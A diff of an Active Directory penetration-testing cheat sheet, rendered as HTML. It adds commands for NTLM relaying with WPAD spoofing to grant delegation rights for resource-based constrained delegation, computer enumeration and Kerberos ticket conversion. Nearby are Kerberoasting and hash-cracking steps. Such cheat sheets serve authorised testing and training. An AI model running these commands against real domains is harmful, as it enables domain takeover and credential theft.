@@ -211,11 +211,14 @@ ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w
 
 <span class="c1"># Abuse WPAD to dump useful information and create a new persisten account on the DC (an administrator should perform a login while listening)</span>
 
-<span class="c1"># Using SMB (if enabled on the DC)</span>
+<span class="c1">## Using SMB (if enabled on the DC)</span>
 ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump<span class="w"> </span>-smb2support
 
-<span class="c1"># Using LDAP (if enabled on the DC)</span>
+<span class="c1">## Using LDAP (if enabled on the DC)</span>
 ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldap://&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump
+
+<span class="c1"># Add computer with delegation capabilities to relayed computer for Resource-based Constrained Delegation:</span>
+ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-t<span class="w"> </span>ldap://&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump<span class="w"> </span>--add-computer<span class="w"> </span>&lt;new<span class="w"> </span>computer<span class="w"> </span>name&gt;<span class="w"> </span>--delegate-access
 </code></pre></div>
 <p>Interesting resources:</p>
 <ul>
@@ -318,6 +321,9 @@ EXEC<span class="w"> </span>master..xp_fileexist<span class="w"> </span><span cl
 <p>Enumerate DC ip by querying DNS:</p>
 <div class="highlight"><pre><span></span><code>nslookup<span class="w"> </span>-type<span class="o">=</span>srv<span class="w"> </span>_ldap._tcp.dc._msdcs.&lt;domain&gt;<span class="w"> </span>&lt;dns<span class="w"> </span>server&gt;
 </code></pre></div>
+<p>Enumerate computers:</p>
+<div class="highlight"><pre><span></span><code>impacket-GetADComputers<span class="w"> </span>username<span class="o">[</span>:password<span class="o">]</span>@target
+</code></pre></div>
 <p>Enumerate users remotely:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
 nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>--users
@@ -370,7 +376,7 @@ nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w">
 <span class="c1"># NetExec - authenticated</span>
 nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--shares
 </code></pre></div>
-<p>Enumerate Domain:</p>
+<p>Enumerate Domain SID:</p>
 <div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--get-sid
 </code></pre></div>
 <p>Enumerate users, groups, group memberships, password policy, shares, etc with <code>enum4linux</code>:</p>
@@ -1242,6 +1248,9 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 </code></pre></div>
 <p>Convert kirbi tickets to hashcat/john crackable format with <a href="https://github.com/nidem/kerberoast">kirby2john</a>:</p>
 <div class="highlight"><pre><span></span><code>kirby2john<span class="w"> </span>&lt;kirbi<span class="w"> </span>ticket&gt;
+</code></pre></div>
+<p>Convert kirbi tickets to ccache format with Impacket's <code>ticketConverter</code>:</p>
+<div class="highlight"><pre><span></span><code>ticketConverter.py<span class="w"> </span>kirbi_ticket.kirbi<span class="w"> </span>ccache_ticket.ccache
 </code></pre></div>
 <p>Try cracking the obtained TGS by using hascat:</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>&lt;other<span class="w"> </span>options&gt;<span class="w"> </span>&lt;<span class="nb">hash</span><span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
